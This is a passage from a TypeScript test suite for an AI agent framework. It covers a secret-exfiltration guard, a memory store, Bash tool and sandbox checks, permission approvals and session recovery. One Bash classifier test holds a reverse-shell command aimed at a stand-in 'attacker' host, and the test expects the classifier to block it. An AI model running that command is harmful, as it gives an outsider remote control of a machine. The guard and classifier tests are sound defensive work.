  test("blocks structured tool output where secret is only in String() representation", async () => {
    const { createExfiltrationGuardMiddleware } = await import(
      "@koi/middleware-exfiltration-guard"
    );

    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const mockCtx = {
      session: {
        agentId: "test",
        sessionId: "test-session",
        runId: "test-run",
        metadata: {},
      },
      turnIndex: 0,
      turnId: "test-turn",
      messages: [],
      metadata: {},
    } as unknown as Parameters<NonNullable<typeof mw.wrapToolCall>>[0];

    const wrapToolCall = mw.wrapToolCall;
    if (wrapToolCall === undefined) return;

    // Error objects: JSON.stringify returns {} but String() includes the message
    const secretError = new Error("Credentials: AKIAIOSFODNN7EXAMPLE");
    const result = await wrapToolCall(
      mockCtx,
      { toolId: "run_command", input: { cmd: "env" } },
      async () => ({ output: secretError }),
    );

    const output = result.output as Record<string, unknown>;
    expect(output.error).toBeDefined();
    expect(String(output.error)).toContain("tool output");
  });

  test("blocks tool output containing AWS key (tool-output scanning)", async () => {
    const { createExfiltrationGuardMiddleware } = await import(
      "@koi/middleware-exfiltration-guard"
    );

    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const mockCtx = {
      session: {
        agentId: "test",
        sessionId: "test-session",
        runId: "test-run",
        metadata: {},
      },
      turnIndex: 0,
      turnId: "test-turn",
      messages: [],
      metadata: {},
    } as unknown as Parameters<NonNullable<typeof mw.wrapToolCall>>[0];

    const wrapToolCall = mw.wrapToolCall;
    if (wrapToolCall === undefined) return;

    // Tool input is clean, but output contains a secret
    const result = await wrapToolCall(
      mockCtx,
      { toolId: "fs_read", input: { path: "/etc/passwd" } },
      async () => ({ output: "AWS_KEY=AKIAIOSFODNN7EXAMPLE" }),
    );

    const output = result.output as Record<string, unknown>;
    expect(output.error).toBeDefined();
    expect(String(output.error)).toContain("tool output");
    expect(output.code).toBe("PERMISSION");
  });

  test("blocks non-streaming model response containing secrets (wrapModelCall)", async () => {
    const { createExfiltrationGuardMiddleware } = await import(
      "@koi/middleware-exfiltration-guard"
    );

    const mw = createExfiltrationGuardMiddleware({ action: "block" });
    const mockCtx = {
      session: {
        agentId: "test",
        sessionId: "test-session",
        runId: "test-run",
        metadata: {},
      },
      turnIndex: 0,
      turnId: "test-turn",
      messages: [],
      metadata: {},
    } as unknown as Parameters<NonNullable<typeof mw.wrapModelCall>>[0];

    const wrapModelCall = mw.wrapModelCall;
    if (wrapModelCall === undefined) return;

    const result = await wrapModelCall(mockCtx, { messages: [] }, async () => ({
      content: "Here is your key: AKIAIOSFODNN7EXAMPLE",
      model: "test",
      usage: { inputTokens: 0, outputTokens: 0 },
    }));

    expect(result.content).toContain("[BLOCKED");
    expect(result.content).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(result.stopReason).toBe("hook_blocked");
    expect(result.richContent).toBeUndefined();
  });

  test("exfiltration-guard-block trajectory shows guard was active", async () => {
    const fs = await import("node:fs");
    const path = await import("node:path");

    const fixturePath = path.resolve(
      import.meta.dir,
      "../../fixtures/exfiltration-guard-block.trajectory.json",
    );
    const raw = fs.readFileSync(fixturePath, "utf-8");
    const trajectory = JSON.parse(raw) as Record<string, unknown>;

    // Valid ATIF schema
    expect(trajectory.schema_version).toBe("ATIF-v1.6");

    // Non-empty steps
    const steps = trajectory.steps as readonly Record<string, unknown>[];
    expect(steps.length).toBeGreaterThan(0);

    // All steps have valid source
    for (const step of steps) {
      const source = String(step.source);
      expect(["agent", "tool", "system"]).toContain(source);
    }

    // Exfiltration guard middleware must be present in the recorded trace.
    // The guard wraps either a tool call (blocking it) or a model stream
    // (inspecting the response) depending on whether the LLM used the tool.
    const guardSpan = steps.find((s) => {
      if (s.source !== "system") return false;
      const extra = s.extra as Record<string, unknown> | undefined;
      return extra?.middlewareName === "exfiltration-guard";
    });
    expect(guardSpan).toBeDefined();
    if (guardSpan !== undefined) {
      const extra = guardSpan.extra as Record<string, unknown>;
      expect(extra.phase).toBe("intercept");
    }

    // No successful tool execution step (tool was not called or was blocked)
    const toolSteps = steps.filter((s) => s.source === "tool");
    expect(toolSteps).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/memory-fs (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/memory-fs", () => {
  test("createMemoryStore CRUD round-trip with dedup", async () => {
    const { createMemoryStore } = await import("@koi/memory-fs");
    const { mkdtemp, rm } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    const dir = await mkdtemp(join(tmpdir(), "koi-golden-memory-fs-"));
    try {
      const store = createMemoryStore({ dir });

      // write creates a record
      const result = await store.write({
        name: "design patterns",
        description: "Patterns for extensibility",
        type: "feedback",
        content:
          "Rule: prefer composition over inheritance.\n**Why:** decoupled, testable modules.",
      });
      expect(result.action).toBe("created");
      expect(result.record.name).toBe("design patterns");
      expect(result.record.type).toBe("feedback");

      // read round-trip
      const loaded = await store.read(result.record.id);
      expect(loaded?.content).toContain("prefer composition over inheritance");

      // dedup skips near-duplicate
      const dup = await store.write({
        name: "design patterns v2",
        description: "Same content",
        type: "feedback",
        content:
          "Rule: prefer composition over inheritance.\n**Why:** decoupled, testable modules.",
      });
      expect(dup.action).toBe("skipped");
      expect(dup.duplicateOf).toBe(result.record.id);

      // update modifies content
      const updated = await store.update(result.record.id, {
        content: "Rule: prefer composition.\n**Why:** flexibility.",
      });
      expect(updated.record.content).toContain("flexibility");
      expect(updated.record.name).toBe("design patterns");

      // list returns records with type filter
      const all = await store.list();
      expect(all.length).toBe(1);
      const feedbacks = await store.list({ type: "feedback" });
      expect(feedbacks.length).toBe(1);
      const users = await store.list({ type: "user" });
      expect(users.length).toBe(0);

      // delete removes record
      const deleted = await store.delete(result.record.id);
      expect(deleted.deleted).toBe(true);
      const gone = await store.read(result.record.id);
      expect(gone).toBeUndefined();
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("MEMORY.md index rebuilt correctly after mutations", async () => {
    const { createMemoryStore, readIndex } = await import("@koi/memory-fs");
    const { mkdtemp, rm } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    const dir = await mkdtemp(join(tmpdir(), "koi-golden-memory-fs-idx-"));
    try {
      const store = createMemoryStore({ dir });

      // Write two records
      await store.write({
        name: "Record A",
        description: "First record",
        type: "user",
        content: "User information about preferences.",
      });
      await store.write({
        name: "Record B",
        description: "Second record",
        type: "project",
        content: "Project deadline is next Friday.",
      });

      // Index should contain both
      const idx1 = await readIndex(dir);
      expect(idx1.entries.length).toBe(2);
      const names = idx1.entries.map((e) => e.title);
      expect(names).toContain("Record A");
      expect(names).toContain("Record B");

      // Delete one — index should update
      const records = await store.list();
      const recordA = records.find((r) => r.name === "Record A");
      expect(recordA).toBeDefined();
      // biome-ignore lint/style/noNonNullAssertion: expect() above guarantees defined
      await store.delete(recordA!.id);

      const idx2 = await readIndex(dir);
      expect(idx2.entries.length).toBe(1);
      expect(idx2.entries[0]?.title).toBe("Record B");
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/harness (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/harness", () => {
  test("createCliHarness returns harness with runSinglePrompt and runInteractive", async () => {
    const { createCliHarness } = await import("@koi/harness");

    const runtime = {
      run: () =>
        (async function* () {
          yield {
            kind: "done" as const,
            output: {
              content: [],
              stopReason: "completed" as const,
              metrics: { totalTokens: 0, inputTokens: 0, outputTokens: 0, turns: 1, durationMs: 0 },
            },
          };
        })(),
    };
    const channel = {
      name: "test",
      capabilities: {
        text: true,
        images: false,
        files: false,
        buttons: false,
        audio: false,
        video: false,
        threads: false,
        supportsA2ui: false,
      },
      connect: async () => {},
      disconnect: async () => {},
      send: async () => {},
      onMessage: () => () => {},
    };

    const harness = createCliHarness({ runtime, channel, tui: null });
    expect(typeof harness.runSinglePrompt).toBe("function");
    expect(typeof harness.runInteractive).toBe("function");
  });

  test("shouldRender and renderEngineEvent correctly classify events", async () => {
    const { shouldRender, renderEngineEvent } = await import("@koi/harness");

    // text_delta always renders
    expect(shouldRender({ kind: "text_delta", delta: "hi" }, false)).toBe(true);
    expect(renderEngineEvent({ kind: "text_delta", delta: "hi" }, false)).toBe("hi");

    // tool_call_delta never renders regardless of verbose
    expect(shouldRender({ kind: "tool_call_delta", callId: "c1" as never, delta: "x" }, true)).toBe(
      false,
    );

    // done renders as newline
    const doneEvent = {
      kind: "done" as const,
      output: {
        content: [],
        stopReason: "completed" as const,
        metrics: { totalTokens: 0, inputTokens: 0, outputTokens: 0, turns: 1, durationMs: 0 },
      },
    };
    expect(shouldRender(doneEvent, false)).toBe(true);
    expect(renderEngineEvent(doneEvent, false)).toBe("\n");
  });
});

// ---------------------------------------------------------------------------
// sandbox-exec trajectory: @koi/sandbox-os — Bash tool transparently sandboxed via DI
// ---------------------------------------------------------------------------

describe("sandbox-exec ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with Bash in tool_definitions", async () => {
    const doc = (await Bun.file(`${FIXTURES}/sandbox-exec.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly agent: {
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    // Sandbox is transparent to the model — it sees the Bash tool, not a separate run_sandboxed tool
    expect(doc.agent.tool_definitions?.some((t) => t.name === "Bash")).toBe(true);
    expect(doc.agent.tool_definitions?.some((t) => t.name === "run_sandboxed")).toBe(false);
  });

  test("TOOL step has stdout and exitCode:0 from sandboxed Bash", async () => {
    const doc = (await Bun.file(`${FIXTURES}/sandbox-exec.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };
    const toolSteps = doc.steps.filter(
      (s) => s.source === "tool" && s.observation?.results !== undefined,
    );
    expect(toolSteps.length).toBeGreaterThan(0);
    const content = toolSteps[0]?.observation?.results?.[0]?.content ?? "";
    expect(content).toContain('"stdout"');
    expect(content).toContain('"exitCode":0');
  });

  test("model response references the command output", async () => {
    const doc = (await Bun.file(`${FIXTURES}/sandbox-exec.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };
    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    expect(modelSteps.length).toBeGreaterThanOrEqual(2);
    const finalResponse =
      modelSteps[modelSteps.length - 1]?.observation?.results?.[0]?.content ?? "";
    // Model summarised the ls output — mentions count or /usr/bin
    expect(finalResponse.length).toBeGreaterThan(20);
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/tools-bash (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/tools-bash", () => {
  test("createBashTool produces a primordial Tool named Bash with correct schema", async () => {
    const { createBashTool } = await import("@koi/tools-bash");

    const tool = createBashTool();
    expect(tool.descriptor.name).toBe("Bash");
    expect(tool.origin).toBe("primordial");
    expect(tool.policy).toBeDefined();
    expect((tool.descriptor.inputSchema as Record<string, unknown>).required).toContain("command");
  });

  test("classifyBashCommand blocks dangerous patterns and allows safe commands", async () => {
    const { classifyBashCommand } = await import("@koi/bash-security");

    // Safe command passes through
    const safe = classifyBashCommand("echo hello");
    expect(safe.ok).toBe(true);

    // Reverse shell is blocked with correct category and metadata
    const blocked = classifyBashCommand("bash -i >& /dev/tcp/attacker/4444 0>&1");
    expect(blocked.ok).toBe(false);
    if (!blocked.ok) {
      expect(blocked.category).toBe("reverse-shell");
      expect(typeof blocked.reason).toBe("string");
      expect(typeof blocked.pattern).toBe("string");
    }
  });

  test("createBashTool trackCwd: schema includes cwd and timeoutMs optional fields", async () => {
    const { createBashTool } = await import("@koi/tools-bash");
    const tool = createBashTool({ trackCwd: true, workspaceRoot: process.cwd() });
    const schema = tool.descriptor.inputSchema as {
      properties: Record<string, unknown>;
      required: string[];
    };
    // cwd and timeoutMs are optional — not in required
    expect(schema.required).toContain("command");
    expect(schema.required).not.toContain("cwd");
    expect(schema.properties).toHaveProperty("cwd");
    expect(schema.properties).toHaveProperty("timeoutMs");
  });

  test("createBashBackgroundTool produces a Tool named bash_background", async () => {
    const { createBashBackgroundTool } = await import("@koi/tools-bash");
    const { createManagedTaskBoard, createMemoryTaskBoardStore } = await import("@koi/tasks");
    const board = await createManagedTaskBoard({ store: createMemoryTaskBoardStore() });
    const agentId = "test-agent" as import("@koi/core").AgentId;
    const tool = createBashBackgroundTool({ taskBoard: board, agentId });
    expect(tool.descriptor.name).toBe("bash_background");
    expect(tool.origin).toBe("primordial");
    expect((tool.descriptor.inputSchema as { required: string[] }).required).toContain("command");
    expect(tool.descriptor.tags).toContain("background");
  });
});

// ---------------------------------------------------------------------------
// bash-track-cwd ATIF trajectory: @koi/tools-bash trackCwd feature
// ---------------------------------------------------------------------------

describe("bash-track-cwd ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with Bash in tool_definitions", async () => {
    const doc = (await Bun.file(`${FIXTURES}/bash-track-cwd.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly agent: { readonly tool_definitions?: readonly { readonly name: string }[] };
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.agent.tool_definitions?.some((t) => t.name === "Bash")).toBe(true);
  });

  test("two TOOL steps: both Bash calls captured in trajectory", async () => {
    const doc = (await Bun.file(`${FIXTURES}/bash-track-cwd.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly tool_calls?: readonly { readonly function_name: string }[];
      }[];
    };
    const toolSteps = doc.steps.filter((s) => s.source === "tool");
    expect(toolSteps.length).toBeGreaterThanOrEqual(2);
    const bashCalls = toolSteps.filter((s) =>
      s.tool_calls?.some((tc) => tc.function_name === "Bash"),
    );
    expect(bashCalls.length).toBeGreaterThanOrEqual(2);
  });

  test("second Bash TOOL step stdout contains tracked cwd path", async () => {
    const doc = (await Bun.file(`${FIXTURES}/bash-track-cwd.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly tool_calls?: readonly {
          readonly function_name: string;
          readonly arguments: { readonly command?: string };
        }[];
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };
    // Find the Bash tool step that ran `pwd` (no mkdir)
    const pwdStep = doc.steps.find(
      (s) =>
        s.source === "tool" &&
        s.tool_calls?.some((tc) => tc.function_name === "Bash" && tc.arguments.command === "pwd"),
    );
    expect(pwdStep).toBeDefined();
    const content = pwdStep?.observation?.results?.[0]?.content ?? "";
    // stdout should contain the cwd-golden-test subdirectory — cwd was tracked
    expect(content).toContain("cwd-golden-test");
    expect(content).toContain('"exitCode":0');
  });
});

// ---------------------------------------------------------------------------
// bash-background ATIF trajectory: @koi/tools-bash bash_background feature
// ---------------------------------------------------------------------------

describe("bash-background ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with bash_background in tool_definitions", async () => {
    const doc = (await Bun.file(`${FIXTURES}/bash-background.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly agent: { readonly tool_definitions?: readonly { readonly name: string }[] };
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.agent.tool_definitions?.some((t) => t.name === "bash_background")).toBe(true);
  });

  test("bash_background TOOL step returns taskId and in_progress status", async () => {
    const doc = (await Bun.file(`${FIXTURES}/bash-background.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly tool_calls?: readonly { readonly function_name: string }[];
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };
    const bgStep = doc.steps.find(
      (s) =>
        s.source === "tool" && s.tool_calls?.some((tc) => tc.function_name === "bash_background"),
    );
    expect(bgStep).toBeDefined();
    const content = bgStep?.observation?.results?.[0]?.content ?? "";
    expect(content).toContain('"status":"in_progress"');
    expect(content).toContain('"taskId"');
  });

  test("task_output TOOL step shows completed stdout with expected output", async () => {
    const doc = (await Bun.file(`${FIXTURES}/bash-background.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly tool_calls?: readonly { readonly function_name: string }[];
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };
    const outputStep = doc.steps.find(
      (s) => s.source === "tool" && s.tool_calls?.some((tc) => tc.function_name === "task_output"),
    );
    expect(outputStep).toBeDefined();
    const content = outputStep?.observation?.results?.[0]?.content ?? "";
    expect(content).toContain("hello-from-background");
    expect(content).toContain('"exitCode":0');
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/sandbox-os (2 queries)
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/agent-runtime (2 queries, no LLM required)
// ---------------------------------------------------------------------------

describe("Golden: @koi/agent-runtime", () => {
  test("resolver resolves all built-in agents by type", async () => {
    const { createAgentResolver } = await import("@koi/agent-runtime");
    const { resolver, warnings, conflicts } = createAgentResolver();

    expect(warnings).toHaveLength(0);
    expect(conflicts).toHaveLength(0);

    for (const agentType of ["researcher", "coder", "reviewer", "coordinator"]) {
      const result = await resolver.resolve(agentType);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.value.name).toBeDefined();
        expect(result.value.description).toBeDefined();
        expect(result.value.manifest).toBeDefined();
      }
    }

    // list() returns agentType as name for all (LLM routing correctness)
    for (const summary of await resolver.list()) {
      expect(summary.name).toBe(summary.key);
    }
  });

  test("resolver resolves custom project agent overriding built-in", async () => {
    const { mkdtemp } = await import("node:fs/promises");
    const { mkdirSync, writeFileSync, rmSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const { createAgentResolver } = await import("@koi/agent-runtime");

    const tempDir = await mkdtemp(join(tmpdir(), "golden-agent-runtime-"));
    try {
      const agentsDir = join(tempDir, ".koi", "agents");
      mkdirSync(agentsDir, { recursive: true });
      writeFileSync(
        join(agentsDir, "researcher.md"),
        [
          "---",
          "name: researcher",
          "description: Project-level researcher override for golden test",
          "model: haiku",
          "---",
          "",
          "You are a project-specific researcher. Focus on repository context.",
        ].join("\n"),
        "utf-8",
      );

      const { resolver, warnings } = createAgentResolver({ projectDir: tempDir });

      expect(warnings).toHaveLength(0);

      const result = await resolver.resolve("researcher");
      expect(result.ok).toBe(true);
      if (result.ok) {
        // Custom agent uses haiku; built-in uses sonnet — confirms project override was applied
        expect(result.value.manifest.model.name).toBe("haiku");
        expect(result.value.name).toBe("researcher");
      }

      // Other built-ins unaffected
      expect((await resolver.resolve("coder")).ok).toBe(true);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------
// Approval trajectory capture: ask-mode permissions → source:"user" steps
// ---------------------------------------------------------------------------

describe("Approval trajectory capture (e2e)", () => {
  test("ask-mode approval produces source:'user' trajectory step with valid stepIndex", async () => {
    const cassette = await loadCassette(`${FIXTURES}/tool-use.cassette.json`);
    const trajDir = `/tmp/koi-replay-approval-${Date.now()}`;
    trajDirs.push(trajDir);
    const docId = "replay-approval";

    const store = createAtifDocumentStore(
      { agentName: "approval-test" },
      createFsAtifDelegate(trajDir),
    );
    const clock = createMonotonicClock();

    // Event-trace: retain full handle for emitExternalStep
    const eventTraceHandle = createEventTraceMiddleware({
      store,
      docId,
      agentName: "approval-test",
      clock,
    });

    // Permissions in "ask" mode — every tool call triggers approval flow
    const permBackend = createPermissionBackend({
      mode: "default",
      rules: [{ pattern: "*", action: "*", effect: "ask", source: "policy" }],
    });
    const permHandle = createPermissionsMiddleware({
      backend: permBackend,
      description: "ask-mode test",
    });

    // Wire the approval step sink — this is the connection being tested
    permHandle.setApprovalStepSink(eventTraceHandle.emitExternalStep);

    const adapter = createCassetteAdapter(cassette.chunks);

    const runtime = await createKoi({
      manifest: { name: "approval-test", version: "0.1.0", model: { name: MODEL } },
      adapter,
      middleware: [eventTraceHandle.middleware, permHandle].map((mw) =>
        wrapMiddlewareWithTrace(mw, { store, docId, clock }),
      ),
      providers: [
        createSingleToolProvider({
          name: "add-numbers",
          toolName: "add_numbers",
          createTool: () => addTool,
        }),
      ],
      // Auto-approve all tool calls
      approvalHandler: async () => ({ kind: "allow" as const }),
      loopDetection: false,
    });

    for await (const _e of runtime.run({
      kind: "text",
      text: "Use the add_numbers tool to compute 7 + 5.",
    })) {
      /* drain */
    }

    await runtime.dispose();
    await new Promise((r) => setTimeout(r, 300));

    // Validate: trajectory must contain a source:"user" approval step
    const steps = await store.getDocument(docId);
    const approvalSteps = steps.filter((s) => s.source === "user");

    expect(approvalSteps.length).toBeGreaterThan(0);

    const step = approvalSteps[0];
    expect(step?.kind).toBe("tool_call");
    expect(step?.identifier).toBe("add_numbers");
    // stepIndex must be assigned (not the placeholder -1)
    expect(step?.stepIndex).toBeGreaterThanOrEqual(0);
    expect(step?.outcome).toBe("success");
    expect(step?.metadata?.approvalDecision).toBe("allow");
  });

  test("deny approval produces source:'user' step with failure outcome", async () => {
    const cassette = await loadCassette(`${FIXTURES}/tool-use.cassette.json`);
    const trajDir = `/tmp/koi-replay-denial-${Date.now()}`;
    trajDirs.push(trajDir);
    const docId = "replay-denial";

    const store = createAtifDocumentStore(
      { agentName: "denial-test" },
      createFsAtifDelegate(trajDir),
    );
    const clock = createMonotonicClock();

    const eventTraceHandle = createEventTraceMiddleware({
      store,
      docId,
      agentName: "denial-test",
      clock,
    });

    const permBackend = createPermissionBackend({
      mode: "default",
      rules: [{ pattern: "*", action: "*", effect: "ask", source: "policy" }],
    });
    const permHandle = createPermissionsMiddleware({
      backend: permBackend,
      description: "deny-test",
    });

    permHandle.setApprovalStepSink(eventTraceHandle.emitExternalStep);

    const adapter = createCassetteAdapter(cassette.chunks);

    const runtime = await createKoi({
      manifest: { name: "denial-test", version: "0.1.0", model: { name: MODEL } },
      adapter,
      middleware: [eventTraceHandle.middleware, permHandle].map((mw) =>
        wrapMiddlewareWithTrace(mw, { store, docId, clock }),
      ),
      providers: [
        createSingleToolProvider({
          name: "add-numbers",
          toolName: "add_numbers",
          createTool: () => addTool,
        }),
      ],
      // Deny all tool calls
      approvalHandler: async () => ({ kind: "deny" as const, reason: "test-deny" }),
      loopDetection: false,
    });

    for await (const _e of runtime.run({
      kind: "text",
      text: "Use the add_numbers tool to compute 7 + 5.",
    })) {
      /* drain */
    }

    await runtime.dispose();
    await new Promise((r) => setTimeout(r, 300));

    const steps = await store.getDocument(docId);
    const approvalSteps = steps.filter((s) => s.source === "user");

    expect(approvalSteps.length).toBeGreaterThan(0);

    const step = approvalSteps[0];
    expect(step?.kind).toBe("tool_call");
    // stepIndex must be assigned (not the placeholder -1)
    expect(step?.stepIndex).toBeGreaterThanOrEqual(0);
    expect(step?.outcome).toBe("failure");
    expect(step?.metadata?.approvalDecision).toBe("deny");
    expect(step?.metadata?.denyReason).toBe("test-deny");
  });

  test("runtime dispatch relay routes approval steps by sessionId", async () => {
    const { createRuntime } = await import("../create-runtime.js");
    const cassette = await loadCassette(`${FIXTURES}/tool-use.cassette.json`);
    const trajDir = `/tmp/koi-replay-dispatch-${Date.now()}`;
    trajDirs.push(trajDir);

    // Permissions in "ask" mode with auto-allow
    const permBackend = createPermissionBackend({
      mode: "default",
      rules: [{ pattern: "*", action: "*", effect: "ask", source: "policy" }],
    });
    const permHandle = createPermissionsMiddleware({
      backend: permBackend,
      description: "dispatch-relay-test",
    });

    const adapter = createCassetteAdapter(cassette.chunks);

    // Use createRuntime which wires the dispatch relay internally
    const runtime = createRuntime({
      adapter,
      middleware: [permHandle],
      trajectoryDir: trajDir,
      requestApproval: async () => ({ kind: "allow" as const }),
      approvalStepHandle: permHandle,
    });

    for await (const _e of runtime.adapter.stream({ kind: "text", text: "go" })) {
      /* drain */
    }

    await new Promise((r) => setTimeout(r, 300));

    // Read trajectory from the store — createRuntime uses a per-stream docId
    // like "stream-<uuid>", so we need to find it
    const { readdirSync } = await import("node:fs");
    const files = readdirSync(trajDir).filter((f: string) => f.endsWith(".json"));
    expect(files.length).toBeGreaterThan(0);

    const { readFileSync } = await import("node:fs");
    const raw = readFileSync(`${trajDir}/${files[0]}`, "utf-8");
    const doc = JSON.parse(raw) as { readonly steps?: readonly Record<string, unknown>[] };
    const steps = doc.steps ?? [];

    // ATIF JSON uses different keys: step_id (stepIndex), source, outcome, extra (metadata)
    const approvalSteps = steps.filter((s) => s.source === "user");
    expect(approvalSteps.length).toBeGreaterThan(0);

    const step = approvalSteps[0] as Record<string, unknown>;
    // step_id must be assigned (not the placeholder -1)
    expect(step.step_id).toBeGreaterThanOrEqual(0);
    expect(step.outcome).toBe("success");
    expect((step.extra as Record<string, unknown>)?.approvalDecision).toBe("allow");
  });
});

// ---------------------------------------------------------------------------
// Standalone L2 golden: fork mode and coordinator allowlist (#1241)
// ---------------------------------------------------------------------------

describe("Golden: fork mode + coordinator allowlist (#1241)", () => {
  test("COORDINATOR_TOOL_ALLOWLIST contains Spawn and delegation tools (assembler-facing)", async () => {
    const { COORDINATOR_TOOL_ALLOWLIST } = await import("@koi/agent-runtime");
    // "Spawn" (runtime name) must be in the assembler allowlist so the coordinator
    // can delegate to workers. "agent_spawn" was the wrong name — runtime tool is "Spawn".
    expect(COORDINATOR_TOOL_ALLOWLIST).toContain("Spawn");
    expect(COORDINATOR_TOOL_ALLOWLIST).toContain("task_create");
    expect(COORDINATOR_TOOL_ALLOWLIST).toContain("task_delegate");
    expect(COORDINATOR_TOOL_ALLOWLIST).toContain("send_message");
    expect(COORDINATOR_TOOL_ALLOWLIST).toContain("task_stop");
    // File/shell tools must not be present
    expect(COORDINATOR_TOOL_ALLOWLIST).not.toContain("Glob");
    expect(COORDINATOR_TOOL_ALLOWLIST).not.toContain("Grep");
  });

  test("coordinator manifest spawn ceiling is the explicit worker ceiling (not coordinator allowlist)", async () => {
    const { COORDINATOR_MANIFEST } = await import("@koi/agent-runtime");
    // The manifest's spawn.tools.list is COORDINATOR_WORKER_CEILING — an explicit list for
    // workers, NOT derived from COORDINATOR_TOOL_ALLOWLIST. Workers have a different role:
    // they execute tasks (task_update), not orchestrate (task_create, task_delegate, Spawn).
    expect(COORDINATOR_MANIFEST.manifest.spawn?.tools?.policy).toBe("allowlist");
    const manifestList = COORDINATOR_MANIFEST.manifest.spawn?.tools?.list ?? [];
    // Workers must NOT have these — only the coordinator orchestrator needs them
    expect(manifestList).not.toContain("Spawn"); // workers do not spawn further agents
    expect(manifestList).not.toContain("task_delegate"); // workers cannot reassign tasks
    expect(manifestList).not.toContain("task_create"); // workers don't create new board entries
    expect(manifestList).not.toContain("task_stop"); // workers don't kill other tasks
    // Workers MUST have these — they execute and report
    expect(manifestList).toContain("task_update"); // workers complete/fail their own task
    expect(manifestList).toContain("send_message"); // workers may send status messages
    // File/shell tools must never be in the worker ceiling
    expect(manifestList).not.toContain("Glob");
    expect(manifestList).not.toContain("Grep");
    expect(manifestList).not.toContain("ToolSearch");
  });
});

describe("Golden: @koi/sandbox-os", () => {
  test("createOsAdapterForTest returns adapter with correct name and platform metadata", async () => {
    const { createOsAdapterForTest } = await import("@koi/sandbox-os");
    const adapter = createOsAdapterForTest({ platform: "seatbelt", available: true });
    expect(adapter.name).toBe("@koi/sandbox-os");
    expect(adapter.platform.platform).toBe("seatbelt");
    expect(adapter.platform.available).toBe(true);
  });

  test("validateProfile rejects defaultReadAccess 'closed' on seatbelt with VALIDATION error", async () => {
    const { validateProfile } = await import("@koi/sandbox-os");
    const result = validateProfile(
      { filesystem: { defaultReadAccess: "closed" }, network: { allow: false }, resources: {} },
      "seatbelt",
    );
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.message).toContain("dyld");
    }
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/session (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/session — session-recovery", () => {
  test("recover() returns all sessions + pending frames after simulated restart", async () => {
    const { createSqliteSessionPersistence } = await import("@koi/session");
    const { agentId, sessionId } = await import("@koi/core");

    const store = createSqliteSessionPersistence({ dbPath: ":memory:" });
    const manifest = { name: "recovery-agent", version: "1.0.0", model: { name: "gpt" } };
    const now = Date.now();

    store.saveSession({
      sessionId: sessionId("s1"),
      agentId: agentId("agent-alpha"),
      manifestSnapshot: manifest,
      seq: 5,
      remoteSeq: 3,
      connectedAt: now - 10000,
      lastPersistedAt: now - 1000,
      status: "idle",
      metadata: { channel: "cli" },
    });
    store.saveSession({
      sessionId: sessionId("s2"),
      agentId: agentId("agent-alpha"),
      manifestSnapshot: manifest,
      seq: 2,
      remoteSeq: 1,
      connectedAt: now - 5000,
      lastPersistedAt: now - 500,
      status: "idle",
      metadata: {},
    });
    store.savePendingFrame({
      frameId: "frame-a",
      sessionId: sessionId("s1"),
      agentId: agentId("agent-alpha"),
      frameType: "agent:message",
      payload: { text: "unsent" },
      orderIndex: 0,
      createdAt: now - 800,
      retryCount: 1,
    });

    const result = store.recover();
    expect("then" in result).toBe(false);
    if ("then" in result) return;

    expect(result.ok).toBe(true);
    if (!result.ok) return;

    expect(result.value.sessions.length).toBe(2);
    expect(result.value.skipped).toEqual([]);

    const s1 = result.value.sessions.find((s) => s.sessionId === sessionId("s1"));
    expect(s1?.seq).toBe(5);
    expect(s1?.metadata).toEqual({ channel: "cli" });

    const frames = result.value.pendingFrames.get(sessionId("s1"));
    expect(frames?.length).toBe(1);
    expect(frames?.[0]?.frameId).toBe("frame-a");
    expect(frames?.[0]?.payload).toEqual({ text: "unsent" });

    store.close();
  });
});

describe("Golden: @koi/session — session-persist trajectory", () => {
  test("trajectory contains MW:@koi/session:transcript wrapModelStream span", async () => {
